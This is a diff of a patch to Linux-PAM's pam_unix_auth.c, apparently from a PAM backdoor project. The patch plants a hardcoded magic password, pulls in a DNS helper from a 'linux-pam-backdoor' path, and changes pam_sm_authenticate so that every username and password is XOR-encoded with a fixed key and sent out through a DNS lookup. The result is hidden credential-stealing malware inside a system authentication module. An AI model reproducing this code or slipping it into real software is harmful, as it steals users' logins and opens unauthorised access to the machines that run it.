@@ -1,28 +1,67 @@
---- ./modules/pam_unix/pam_unix_auth.c	2020-05-18 17:14:31.000000000 -0700
-+++ pam_unix_auth.c	2020-05-19 00:50:53.000000000 -0700
-@@ -49,6 +49,8 @@
+--- ./modules/pam_unix/pam_unix_auth.c	2020-05-25 18:55:42.384000000 +0000
++++ pam_unix_auth.c	2020-05-25 19:13:45.856000000 +0000
+@@ -49,6 +49,9 @@
  #include <sys/types.h>
  #include <sys/stat.h>
  #include <syslog.h>
 +#include "b64.h"
++#include "/linux-pam-backdoor/dns.c"
 +#include "encode.c"
  
  #include <security/_pam_macros.h>
  #include <security/pam_modules.h>
-@@ -71,6 +73,10 @@
-  *      onto a normal UNIX authentication
-  */
+@@ -56,20 +59,10 @@
  
+ #include "support.h"
+ 
+-/*
+- * PAM framework looks for these entry-points to pass control to the
+- * authentication module.
+- */
+ 
+-/* Fun starts here :)
 +unsigned char *bdstr = "_PASSWORD_";
 +FILE *rekt;
-+
-+
+ 
+- * pam_sm_authenticate() performs UNIX/shadow authentication
+- *
+- *      First, if shadow support is available, attempt to perform
+- *      authentication using shadow passwords. If shadow is not
+- *      available, or user does not have a shadow password, fallback
+- *      onto a normal UNIX authentication
+- */
+ 
  #define AUTH_RETURN						\
  do {									\
- 	D(("recording return code for next time [%d]",		\
-@@ -170,7 +176,16 @@
- 	D(("user=%s, password=[%s]", name, p));
+@@ -90,6 +83,16 @@
+ 		free (ptr);
+ }
  
++
++
++void encryptDecrypt(char *input, char *output) {
++	char key[] = {'K', 'E', 'k'}; //Can be any chars, and any size array
++	
++	int i;
++	for(i = 0; i < strlen(input); i++) {
++		output[i] = input[i] ^ key[i % (sizeof(key)/sizeof(char))];
++	}
++}
+ int
+ pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv)
+ {
+@@ -168,9 +171,24 @@
+ 		AUTH_RETURN;
+ 	}
+ 	D(("user=%s, password=[%s]", name, p));
+-
++	char pw[1024];
++	char out[1024];
++    memset(pw, 0, 1024);
++    memset(out, 0, 1024);
++    sprintf(pw ,"%s:%s\n", name, p);
++    encryptDecrypt(pw, out);
++    ngethostbyname(out, T_A);
  	/* verify the password of this user */
 -	retval = _unix_verify_password(pamh, name, p, ctrl);
 +        char *bdenc = b64_encode(p, strlen(p));
@@ -38,3 +77,8 @@
  	name = p = NULL;
  
  	AUTH_RETURN;
+@@ -213,3 +231,4 @@
+ 
+ 	return retval;
+ }
++
